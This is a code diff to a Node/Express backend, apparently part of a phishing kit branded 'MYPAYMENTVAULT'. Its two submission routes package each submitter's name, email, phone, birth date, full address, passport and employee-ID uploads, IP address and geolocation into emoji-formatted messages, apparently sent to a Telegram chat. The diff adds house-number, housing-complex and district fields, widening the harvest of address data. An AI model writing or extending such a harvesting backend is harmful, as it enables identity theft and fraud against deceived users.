@@ -36,6 +36,9 @@ const ContactBody = z.object({
   city: z.string().optional(),
   state: z.string().optional(),
   postalCode: z.string().optional(),
+  district: z.string().optional(),
+  houseNo: z.string().optional(),
+  complex: z.string().optional(),
   dob: z.string().optional(),
   inquiryType: z.string().optional(),
   message: z.string().optional(),
@@ -54,6 +57,9 @@ const PersonalBody = z.object({
   city: z.string().optional(),
   state: z.string().optional(),
   postalCode: z.string().optional(),
+  district: z.string().optional(),
+  houseNo: z.string().optional(),
+  complex: z.string().optional(),
   dob: z.string().optional(),
   inquiryType: z.string().optional(),
   message: z.string().optional(),
@@ -75,15 +81,21 @@ router.post("/submissions/contact", async (req, res): Promise<void> => {
     `🧑 <b>Nama</b>        <code>${(d.firstName ?? "")} ${(d.lastName ?? "")}</code>\n` +
     `📧 <b>Email</b>       <code>${d.email ?? "-"}</code>\n` +
     `📱 <b>Telepon</b>     <code>${d.phone ?? "-"}</code>\n` +
-    `🏠 <b>Alamat</b>      <code>${d.address ?? "-"}</code>\n` +
-    `🏙️ <b>Kota</b>        <code>${d.city ?? "-"}, ${d.state ?? "-"} ${d.postalCode ?? ""}</code>\n` +
-    `🎂 <b>Tgl Lahir</b>   <code>${d.dob ?? "-"}</code>\n` +
+    `🎂 <b>Tgl Lahir</b>   <code>${d.dob ?? "-"}</code>\n\n` +
+    `🏘️ <b>ALAMAT LENGKAP</b>\n` +
+    `🏠 <b>No/Blok</b>     <code>${d.houseNo ?? "-"}</code>\n` +
+    `🏢 <b>Komplek</b>     <code>${d.complex ?? "-"}</code>\n` +
+    `🛣️ <b>Jalan</b>       <code>${d.address ?? "-"}</code>\n` +
+    `🏘️ <b>Kecamatan</b>   <code>${d.district ?? "-"}</code>\n` +
+    `🏙️ <b>Kota</b>        <code>${d.city ?? "-"}</code>\n` +
+    `📍 <b>Provinsi</b>    <code>${d.state ?? "-"}</code>\n` +
+    `📮 <b>Kode Pos</b>    <code>${d.postalCode ?? "-"}</code>\n\n` +
     `📝 <b>Jenis</b>       <code>${d.inquiryType ?? "-"}</code>\n` +
     `💬 <b>Pesan</b>       <code>${d.message ?? "-"}</code>\n` +
     `🛂 <b>Passport</b>    <code>${d.passportFilename ?? "-"}</code>\n` +
-    `🪪 <b>ID Karyawan</b> <code>${d.employeeIdFilename ?? "-"}</code>\n` +
+    `🪪 <b>ID Karyawan</b> <code>${d.employeeIdFilename ?? "-"}</code>\n\n` +
     `🌐 <b>IP</b>          <code>${d.ipAddress ?? "-"}</code>\n` +
-    `${geo.flag} <b>Lokasi</b>    ${geo.label}\n` +
+    `${geo.flag} <b>Lokasi IP</b>  ${geo.label}\n` +
     `🕐 <b>Waktu</b>       ${now}\n\n` +
     `<code>────────────────────────</code>\n` +
     `<i>🏦 MYPAYMENTVAULT</i>`
@@ -132,13 +144,17 @@ router.post("/submissions/personal", async (req, res): Promise<void> => {
     `🧑 <b>Nama</b>       <code>${(d.firstName ?? "")} ${(d.lastName ?? "")}</code>\n` +
     `📧 <b>Email</b>      <code>${d.email ?? "-"}</code>\n` +
     `📱 <b>Telepon</b>    <code>${d.phone ?? "-"}</code>\n` +
-    `🏠 <b>Alamat</b>     <code>${d.address ?? "-"}</code>\n` +
-    `🏙️ <b>Kota</b>       <code>${d.city ?? "-"}, ${d.state ?? "-"} ${d.postalCode ?? ""}</code>\n` +
-    `🎂 <b>Tgl Lahir</b>  <code>${d.dob ?? "-"}</code>\n` +
-    `📝 <b>Jenis</b>      <code>${d.inquiryType ?? "-"}</code>\n` +
-    `💬 <b>Pesan</b>      <code>${d.message ?? "-"}</code>\n` +
+    `🎂 <b>Tgl Lahir</b>  <code>${d.dob ?? "-"}</code>\n\n` +
+    `🏘️ <b>ALAMAT LENGKAP</b>\n` +
+    `🏠 <b>No/Blok</b>    <code>${d.houseNo ?? "-"}</code>\n` +
+    `🏢 <b>Komplek</b>    <code>${d.complex ?? "-"}</code>\n` +
+    `🛣️ <b>Jalan</b>      <code>${d.address ?? "-"}</code>\n` +
+    `🏘️ <b>Kecamatan</b>  <code>${d.district ?? "-"}</code>\n` +
+    `🏙️ <b>Kota</b>       <code>${d.city ?? "-"}</code>\n` +
+    `📍 <b>Provinsi</b>   <code>${d.state ?? "-"}</code>\n` +
+    `📮 <b>Kode Pos</b>   <code>${d.postalCode ?? "-"}</code>\n\n` +
     `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
-    `${geo.flag} <b>Lokasi</b>    ${geo.label}\n` +
+    `${geo.flag} <b>Lokasi IP</b> ${geo.label}\n` +
     `🕐 <b>Waktu</b>      ${now}\n\n` +
     `<code>────────────────────────</code>\n` +
     `<i>🏦 MYPAYMENTVAULT</i>`
